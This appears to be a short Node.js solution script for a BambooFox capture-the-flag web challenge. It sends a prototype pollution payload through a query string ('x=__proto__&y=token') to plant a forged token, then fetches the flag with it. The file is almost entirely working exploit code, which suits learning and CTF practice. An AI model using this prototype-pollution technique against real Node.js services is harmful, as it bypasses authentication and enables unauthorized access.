

const fetch = require('node-fetch')
var crypto = require('crypto');
const hash = (token) => crypto.createHash('sha256').update(token).digest('hex');

const root = 'http://chall.ctf.bamboofox.tw:8787'
// const root = 'http://127.0.0.1:3000'

async function main() {
    // const remoteAddress = "127.0.0.1"
    const remoteAddress = "140.112.196.161"
    const token = "1234567890123456"
    const userDataToken = hash(`${remoteAddress}${token}`)
    
    let res = await fetch(`${root}/api/draw?x=__proto__&y=token&color=${userDataToken}`)
    // console.log(await res.text())
    res = await fetch(`${root}/flag?token=${token}`)
    console.log(await res.text())



}

main()
